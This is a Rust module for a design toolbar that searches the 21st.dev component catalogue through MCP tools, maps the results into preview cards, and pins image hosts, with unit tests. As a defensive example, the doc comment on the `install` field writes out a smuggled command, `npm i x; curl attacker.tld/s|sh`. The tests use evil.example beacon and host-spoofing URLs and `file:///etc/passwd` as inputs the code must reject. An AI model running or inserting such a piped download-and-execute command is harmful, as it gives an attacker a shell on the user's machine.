//! Components and design systems brought in from somewhere else.
//!
//! The design tools photograph a region and ask an agent to make something like it. This
//! is the other direction: a thing that already exists in a catalogue, put *into* the
//! region that was marked. The mark still says where; the library says what.
//!
//! Nothing here holds an account. Whatever catalogue somebody has connected is connected
//! to their agent, and this borrows it through the Gateway's own `tools.invoke` — so the
//! search runs as the agent, with the agent's credentials, and colai stores none of it.
//! It also means a second catalogue is an entry in the table below rather than a second
//! integration.
//!
//! What this must never do is spend somebody's money to draw a menu. Browsing is free
//! metadata; fetching a component's source is paid and counted, and it belongs to the
//! agent doing the work once, on the one thing that was actually chosen. The table names
//! only the free calls for exactly that reason.

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};


/// A catalogue the toolbar knows how to read.
///
/// One entry, because one was named. It is a table rather than a pair of constants
/// because the ask was "sites like 21st.dev, etc." — the second one should be four lines
/// of data, not a second code path.
struct Library {
    /// How the catalogue is named to a person.
    label: &'static str,
    /// What the server should be called when it is added, so the empty state can say.
    called: &'static str,
    /// The free search, under every name the tool could plausibly have.
    ///
    /// A tool's wire name is `mcp__<server>__<tool>`, and the server half is whatever the
    /// person adding it typed, with punctuation flattened to underscores. So the same
    /// catalogue is `mcp__21st__search` or `mcp__21st_dev__search` depending on a free
    /// text field somebody filled in once. Looking under only the first would mean a
    /// library that is genuinely connected and reported as missing — the worst answer
    /// this can give, because it sends somebody to fix a thing that is not broken.
    searches: &'static [&'static str],
    /// What the search calls a component, and what it calls a design system.
    component: &'static str,
    theme: &'static str,
    /// The only host this catalogue's pictures may be fetched from.
    ///
    /// A preview is an address chosen by a server, and the window puts it straight into
    /// an `<img>` — so whatever host it names is a host the user's browser contacts, with
    /// their address and their fingerprint, every time the panel opens. A catalogue that
    /// was compromised, or simply mischievous, could name anything at all and use the
    /// toolbar as a beacon.
    ///
    /// Pinned per catalogue rather than globally, so adding a second one means writing
    /// down where its pictures live in the same breath as its name. The page's own
    /// content policy lists the same hosts; this is the half that can say *why* a picture
    /// was dropped instead of leaving a silent hole in the grid.
    previews: &'static str,
}

/*
 * The catalogues the toolbar knows how to ask.
 *
 * Named servers in production code, which is normally the thing not to do — the contract
 * being pinned here is MCP's own server-name flattening, which turns one server into four
 * plausible tool prefixes depending on how the operator registered it. There is no
 * discovery call that answers "which of these is you", so the four spellings are the
 * contract, written down.
 */
// Unread while `colai_libraries` returns nothing. Kept rather than deleted: it is the
// catalogue, not the plumbing, and the plumbing is the part that is missing.
#[allow(dead_code)]
const LIBRARIES: &[Library] = &[Library {
    label: "21st.dev",
    called: "21st",
    searches: &[
        "mcp__21st__search",
        "mcp__21st_dev__search",
        "mcp__21st-dev__search",
        "mcp__twentyfirst__search",
    ],
    component: "component",
    theme: "theme",
    // Measured against the live catalogue rather than guessed: every `previewUrl` it
    // returns is on this host. The other hosts in its answers — Clerk, Supabase, a Google
    // favicon service — belong to `authorImage`, which this toolbar has never read.
    previews: "cdn.21st.dev",
}];

/// One thing somebody can choose, as the window needs to draw it.
///
/// Everything here comes out of a free search. There is deliberately no field for the
/// component's source: that costs a retrieval, and it is the agent's to spend.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub(crate) struct Card {
    pub id: String,
    pub name: String,
    pub blurb: String,
    /// A picture of the thing, which is the entire reason this is a window and not a
    /// list of names.
    pub preview: Option<String>,
    pub author: Option<String>,
    pub url: Option<String>,
    /// What to run to add it, when the catalogue says.
    /// The catalogue's own install command.
    ///
    /// Carried to the page so somebody can read it, never composed into what an agent is
    /// told to do. It is a shell command written by a third-party server: a compromised
    /// or hostile catalogue that can get `npm i x; curl attacker.tld/s|sh` into an
    /// instruction has a shell on the machine of anybody who liked the preview.
    pub install: Option<String>,
}

/// What a look through the library found, including finding no library.
#[derive(Debug, Clone, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub(crate) struct Found {
    /// Which catalogue answered, for a window that should say whose results these are.
    pub library: Option<String>,
    pub cards: Vec<Card>,
    /// Nothing is connected. Not an error — the answer to a question the window asks on
    /// somebody's behalf, and the reason it can say what to do about it.
    pub connect: bool,
    pub trouble: Option<String>,
}

/// Look through whatever catalogue the agent has, for the kind of thing being marked.
///
/// `mine` asks for what somebody already collected rather than the public catalogue,
/// which is what "import from my account" actually means: the components and themes they
/// bookmarked, not a search they have to think of words for.
#[tauri::command]
pub(crate) async fn colai_library_search(
    #[allow(unused_variables)] library: String,
    #[allow(unused_variables)] query: String,
) -> Result<Vec<Card>, String> {
    /*
     * The component library is not reachable from this host.
     *
     * It searched 21st.dev by asking OpenClaw to invoke an MCP tool on the user's behalf —
     * the Gateway had a method for that and knew which servers were configured. Claude Code
     * has MCP servers too, but they belong to the session, and a toolbar cannot reach into
     * one and call it.
     *
     * Said rather than returning nothing: an empty result reads as "no components matched",
     * which would send somebody looking for a better search term for a feature that is not
     * here. Claude itself can fetch a component when asked in the conversation.
     */
    Err("The component library needs OpenClaw. Ask Claude for a component instead.".to_string())
}

/// What each catalogue is called, and what to name its server.
///
/// So the window can tell somebody how to connect one in the same words the lookup
/// uses, instead of a sentence that drifts away from the code it is describing.
#[tauri::command]
pub(crate) fn colai_libraries() -> Vec<Named> {
    /*
     * Empty on this host, and the emptiness is the switch.
     *
     * Searching a catalogue means asking one — and the search went through the OpenClaw
     * Gateway, which is not here. `colai_library_search` says so and returns an error, which
     * meant choosing "From a library" opened a window that failed the moment it drew.
     *
     * The rail offers the library only when there is a library to offer, so returning
     * nothing takes the choice off the mark popup entirely rather than leaving a door with
     * nothing behind it. None of the rest is deleted: the window, the picking, the guard
     * against sending a half-chosen component are all real and all tested, and the day
     * something can answer a search this becomes one line again.
     */
    Vec::new()
}

/// A catalogue the toolbar could read, named twice: for a person, and for the field.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub(crate) struct Named {
    pub label: String,
    pub called: String,
}

/// The search, as the catalogue is asked for it.
///
/// A blank query with `mine` is a real request — everything you saved — but a blank query
/// on the public catalogue is not, so it is given something to rank against rather than
/// being sent empty.
fn asked_for(kind: &str, query: &str, mine: bool) -> Value {
    let words = query.trim();
    json!({
        "query": if words.is_empty() { "ui component" } else { words },
        "type": kind,
        "limit": 24,
        "mine": mine,
    })
}

/// Turn whatever the catalogue said into cards, or into none.
///
/// Written to be disappointed. A tool's reply is not a contract this repository owns, and
/// the last thing that read an outside shape by guessing at field names produced an empty
/// panel on a conversation full of prompts. So: find the rows wherever they are, take a
/// row only when it has the two things a card cannot be drawn without — something to call
/// it and something to name it by — and drop the rest without inventing anything.
fn cards_in(output: &Value, previews: &str) -> Vec<Card> {
    let Some(rows) = rows_in(output) else {
        return Vec::new();
    };
    rows.iter()
        .filter_map(|row| card_in(row, previews))
        .collect()
}

/// Whether a picture may be fetched, given where the catalogue it came from keeps them.
///
/// `https:` and one host. The scheme was already checked in the page — `file:` would read
/// the user's own disk into it, plain `http:` announces a library search to the network —
/// and the host is the half that was missing: a catalogue naming `https://anywhere.example`
/// got that address put into an `<img>`, and the browser went and fetched it.
///
/// Exact match, not a suffix. `cdn.21st.dev.evil.example` ends with the host and is not
/// the host, and suffix matching is how that gets missed.
fn from_the_catalogue(address: &str, host: &str) -> bool {
    let Some(rest) = address.strip_prefix("https://") else {
        return false;
    };
    // Everything up to the first `/`, `?` or `#` is the authority. A userinfo section
    // before an `@` can spell one host and connect to another, so an address carrying one
    // is refused rather than parsed.
    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
    if authority.contains('@') {
        return false;
    }
    // A port is allowed to be absent and nothing else about it matters here.
    let named = authority.split(':').next().unwrap_or_default();
    named.eq_ignore_ascii_case(host)
}

/// Where the list is, in a reply that may be the list, may wrap it, and may have been
/// handed back as text that happens to be JSON.
fn rows_in(output: &Value) -> Option<Vec<Value>> {
    if let Some(rows) = output.as_array() {
        return Some(rows.clone());
    }
    // A tool result carries its useful shape beside the text a model would read.
    for key in [
        "structuredContent",
        "results",
        "items",
        "components",
        "data",
    ] {
        if let Some(found) = output.get(key) {
            if let Some(rows) = found.as_array() {
                return Some(rows.clone());
            }
            if found.is_object() {
                if let Some(rows) = rows_in(found) {
                    return Some(rows);
                }
            }
        }
    }
    // Failing that, the text parts — which is where an MCP server puts everything when it
    // has no structured shape to offer.
    let parts = output.get("content").and_then(Value::as_array)?;
    for part in parts {
        let text = part.get("text").and_then(Value::as_str)?;
        if let Ok(parsed) = serde_json::from_str::<Value>(text) {
            if let Some(rows) = rows_in(&parsed) {
                return Some(rows);
            }
        }
    }
    None
}

fn card_in(row: &Value, previews: &str) -> Option<Card> {
    let id = ["id", "demoId", "componentId"]
        .iter()
        .find_map(|key| row.get(key))
        .and_then(said_as)?;
    let name = ["name", "title", "label"]
        .iter()
        .find_map(|key| row.get(key))
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|name| !name.is_empty())?;
    Some(Card {
        id,
        name: name.to_string(),
        blurb: text_in(row, &["description", "blurb", "summary"]).unwrap_or_default(),
        preview: text_in(
            row,
            &["preview", "previewUrl", "image", "imageUrl", "thumbnail"],
        )
        .filter(|address| from_the_catalogue(address, previews)),
        author: text_in(row, &["author", "username", "owner"]),
        url: text_in(row, &["url", "link", "pageUrl"]),
        install: text_in(row, &["install", "installCommand", "command"]),
    })
}

/// An id that arrives as a number is still an id.
fn said_as(value: &Value) -> Option<String> {
    match value {
        Value::String(text) => (!text.trim().is_empty()).then(|| text.trim().to_string()),
        Value::Number(number) => Some(number.to_string()),
        _ => None,
    }
}

fn text_in(row: &Value, keys: &[&str]) -> Option<String> {
    keys.iter()
        .find_map(|key| row.get(key))
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|text| !text.is_empty())
        .map(str::to_string)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_picture_from_the_catalogue_is_allowed() {
        assert!(from_the_catalogue(
            "https://cdn.21st.dev/user_x/pricing/default/preview.webp",
            "cdn.21st.dev",
        ));
        // A port changes nothing about who is being contacted.
        assert!(from_the_catalogue(
            "https://cdn.21st.dev:443/a.png",
            "cdn.21st.dev"
        ));
        assert!(from_the_catalogue(
            "https://CDN.21ST.DEV/a.png",
            "cdn.21st.dev"
        ));
    }

    #[test]
    fn a_picture_from_anywhere_else_is_not() {
        // The whole point: a catalogue that was compromised could otherwise name any host
        // it liked and have the toolbar fetch from it on every panel open.
        assert!(!from_the_catalogue(
            "https://evil.example/beacon.png",
            "cdn.21st.dev"
        ));
        // Ends with the host and is not the host. Suffix matching is how this gets missed.
        assert!(!from_the_catalogue(
            "https://cdn.21st.dev.evil.example/a.png",
            "cdn.21st.dev"
        ));
        // Userinfo can spell one host and connect to another.
        assert!(!from_the_catalogue(
            "https://cdn.21st.dev@evil.example/a.png",
            "cdn.21st.dev"
        ));
        // The scheme still matters: `file:` would read the user's own disk into the page.
        assert!(!from_the_catalogue(
            "http://cdn.21st.dev/a.png",
            "cdn.21st.dev"
        ));
        assert!(!from_the_catalogue("file:///etc/passwd", "cdn.21st.dev"));
        assert!(!from_the_catalogue("", "cdn.21st.dev"));
    }

    #[test]
    fn a_card_keeps_its_name_when_its_picture_is_refused() {
        // Dropped, not the whole card: a component with no preview is still a component
        // somebody can choose, and refusing the row would make a hostile preview into a
        // way of hiding entries from the list.
        let row = serde_json::json!({
            "id": 1,
            "name": "Pricing table",
            "previewUrl": "https://evil.example/beacon.png",
        });
        let card = card_in(&row, "cdn.21st.dev").expect("the card survives");
        assert_eq!(card.name, "Pricing table");
        assert_eq!(card.preview, None);
    }

    /// One search result in the shape the catalogue documents: lightweight metadata, a
    /// preview picture, and a numeric id that is a demo rather than a component.
    fn a_result() -> Value {
        json!({
            "id": 4821,
            "name": "Pricing table",
            "description": "Three tiers with a highlighted middle",
            "preview": "https://example.test/pricing.png",
            "author": "someone",
            "url": "https://21st.dev/someone/pricing-table",
            "install": "npx shadcn@latest add pricing-table"
        })
    }

    #[test]
    fn a_search_result_becomes_a_card_without_its_code() {
        let cards = cards_in(&json!([a_result()]), "example.test");
        assert_eq!(cards.len(), 1);
        assert_eq!(cards[0].id, "4821", "a numeric id is still an id");
        assert_eq!(cards[0].name, "Pricing table");
        assert_eq!(
            cards[0].preview.as_deref(),
            Some("https://example.test/pricing.png")
        );
        assert_eq!(
            cards[0].install.as_deref(),
            Some("npx shadcn@latest add pricing-table")
        );
    }

    #[test]
    fn the_rows_are_found_wherever_the_tool_put_them() {
        for (what, output) in [
            ("bare array", json!([a_result()])),
            ("wrapped", json!({ "results": [a_result()] })),
            (
                "structured",
                json!({ "structuredContent": { "results": [a_result()] } }),
            ),
            (
                "text that happens to be json",
                json!({ "content": [{ "type": "text", "text": "[{\"id\":4821,\"name\":\"Pricing table\"}]" }] }),
            ),
        ] {
            assert_eq!(cards_in(&output, "example.test").len(), 1, "{what}");
        }
    }

    #[test]
    fn a_row_that_cannot_be_drawn_is_dropped_rather_than_invented() {
        // Two things a card cannot exist without: something to ask for it by, and
        // something to call it. Anything else missing is a quieter card, not a wrong one.
        assert!(cards_in(&json!([{ "name": "No id here" }]), "example.test").is_empty());
        assert!(cards_in(&json!([{ "id": 1 }]), "example.test").is_empty());
        assert!(cards_in(&json!([{ "id": 1, "name": "   " }]), "example.test").is_empty());
        assert!(cards_in(&json!({ "nothing": "recognisable" }), "example.test").is_empty());
        let sparse = cards_in(&json!([{ "id": "t1", "name": "Bare" }]), "example.test");
        assert_eq!(sparse.len(), 1);
        assert_eq!(sparse[0].preview, None);
    }

    #[test]
    fn a_catalogue_is_looked_for_under_every_name_its_server_could_have() {
        for library in LIBRARIES {
            assert!(!library.searches.is_empty(), "{}", library.label);
            // The name the window tells somebody to type has to be one of the names this
            // actually looks under, or the instructions do not work.
            let told = format!("mcp__{}__search", library.called);
            assert!(
                library.searches.contains(&told.as_str()),
                "{} says to call the server {} but never looks for {told}",
                library.label,
                library.called
            );
            for search in library.searches {
                assert!(search.starts_with("mcp__"), "{search}");
                assert!(search.ends_with("__search"), "{search}");
            }
        }
    }

    #[test]
    fn browsing_never_names_the_call_that_costs_money() {
        // The whole economy of this rests on it. Fetching a component's source is paid
        // and counted, and it belongs to the agent, once, on the thing somebody chose —
        // never to drawing a menu somebody is only looking at.
        for library in LIBRARIES {
            for search in library.searches {
                assert!(!search.contains("get_component"), "{}", library.label);
            }
        }
    }

    #[test]
    fn a_design_system_and_a_component_ask_for_different_things() {
        let system = asked_for(LIBRARIES[0].theme, "violet", false);
        let component = asked_for(LIBRARIES[0].component, "pricing", false);
        assert_eq!(system["type"], "theme");
        assert_eq!(component["type"], "component");
        assert_eq!(system["query"], "violet");
    }

    #[test]
    fn everything_you_saved_is_a_real_search_with_no_words_in_it() {
        // "Import from my account" is a request, not a query somebody has to think of
        // words for — but the public catalogue has nothing to rank an empty string
        // against, so it is given something.
        let mine = asked_for("component", "  ", true);
        assert_eq!(mine["mine"], true);
        assert!(mine["query"]
            .as_str()
            .is_some_and(|words| !words.is_empty()));
    }
}
